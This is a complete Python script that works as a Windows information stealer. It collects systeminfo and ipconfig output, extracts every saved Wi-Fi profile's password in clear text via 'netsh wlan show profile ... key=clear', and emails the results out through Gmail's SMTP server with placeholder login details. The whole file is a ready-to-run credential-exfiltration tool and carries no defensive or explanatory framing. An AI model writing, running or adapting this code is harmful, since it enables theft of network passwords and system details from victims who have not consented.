#!/usr/bin/env python3
import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP_SSL("smtp.gmail.com", "465")
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


system_info = subprocess.check_output("systeminfo", shell=True)
result = system_info.decode("utf-8")
ipconfig = subprocess.check_output("ipconfig", shell=True)
result += ipconfig.decode("utf-8")
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall(r"(?:Profile\s*:\s)(.*)", networks.decode("utf-8"))
for network_name in network_names:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result.decode("utf-8")
send_mail("youremail@gmail.com", "yourpassword", result)
